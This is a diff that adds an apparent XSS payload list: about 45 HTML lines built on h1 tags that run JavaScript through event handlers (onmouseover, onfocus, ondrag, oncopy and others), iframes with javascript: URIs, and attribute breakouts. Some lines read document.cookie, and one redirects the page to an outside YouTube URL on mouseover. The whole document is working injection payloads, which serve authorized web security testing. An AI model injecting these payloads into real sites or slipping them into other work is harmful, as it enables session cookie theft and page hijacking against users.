@@ -1,0 +1,45 @@
+<h1 draggable="true" ondrag="alert(1)">test</h1>
+<h1 draggable="true" ondragend="alert(1)">test</h1>
+<h1 draggable="true" ondragenter="alert(1)">test</h1>
+<h1 draggable="true" ondragleave="alert(1)">test</h1>
+<h1 draggable="true" ondragstart="alert(1)">test</h1>
+<h1><font color=blue>hellox worldss</h1>
+<h1 id=x tabindex=1 onactivate=alert(1)></h1>
+<h1 id=x tabindex=1 onbeforeactivate=alert(1)></h1>
+<h1 id=x tabindex=1 onbeforedeactivate=alert(1)></h1><input autofocus>
+<h1 id=x tabindex=1 ondeactivate=alert(1)></h1><input id=y autofocus>
+<h1 id=x tabindex=1 onfocus=alert(1)></h1>
+<h1 id=x tabindex=1 onfocusin=alert(1)></h1>
+"><h1><IFRAME SRC="javascript:alert(1134);"></IFRAME>">123</h1>
+"><h1><IFRAME SRC="javascript:alert(1142);"></IFRAME>">123</h1>
+"><h1><IFRAME SRC="javascript:alert('XSS');"></IFRAME>">123</h1>
+"><h1><IFRAME SRC=# onmouseover="alert(1135)"></IFRAME>123</h1>
+"><h1><IFRAME SRC=# onmouseover="alert(1138)"></IFRAME>123</h1>
+"><h1><IFRAME SRC=# onmouseover="alert(1143)"></IFRAME>123</h1>
+"><h1><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>123</h1>
+><h1><IFRAME width="420" height="315" frameborder="0" onmouseover="document.location.href='https://www.youtube.com/channel/UC9Qa_gXarSmObPX3ooIQZr
+"><h1><iframe width="420" height="315" src="http://www.youtube.com/embed/sxvccpasgTE" frameborder="0" allowfullscreen></iframe>123</h1>
+"><h1><IFRAME width="420" height="315" SRC="http://www.youtube.com/embed/sxvccpasgTE" frameborder="0" onmouseover="alert(1140)"></IFRAME>123</h1>
+"><h1><IFRAME width="420" height="315" SRC="http://www.youtube.com/embed/sxvccpasgTE" frameborder="0" onmouseover="alert(document.cookie)"></IFRAME>123</h1>
+<h1 onbeforecopy="alert(1)" contenteditable>test</h1>
+<h1 onbeforecut="alert(1)" contenteditable>test</h1>
+<h1 onbeforepaste="alert(1)" contenteditable>test</h1>
+<h1 onblur=alert(1) tabindex=1 id=x></h1><input autofocus>
+<h1 onclick="alert(1)">test</h1>
+<h1 oncontextmenu="alert(1)">test</h1>
+<h1 oncopy="alert(1)" contenteditable>test</h1>
+<h1 oncut="alert(1)" contenteditable>test</h1>
+<h1 ondblclick="alert(1)">test</h1>
+<h1 onfocusout=alert(1) tabindex=1 id=x></h1><input autofocus>
+<h1 onkeydown="alert(1)" contenteditable>test</h1>
+<h1 onkeypress="alert(1)" contenteditable>test</h1>
+<h1 onkeyup="alert(1)" contenteditable>test</h1>
+<h1 onmousedown="alert(1)">test</h1>
+<h1 onmouseenter="alert(1)">test</h1>
+<h1 onmouseleave="alert(1)">test</h1>
+<h1 onmousemove="alert(1)">test</h1>
+<h1 onmouseout="alert(1)">test</h1>
+<h1 onmouseover="alert(1)">test</h1>
+<h1/onmouseover='alert(1)'>xss
+<h1 onmouseup="alert(1)">test</h1>
+<h1 onpaste="alert(1)" contenteditable>test</h1>
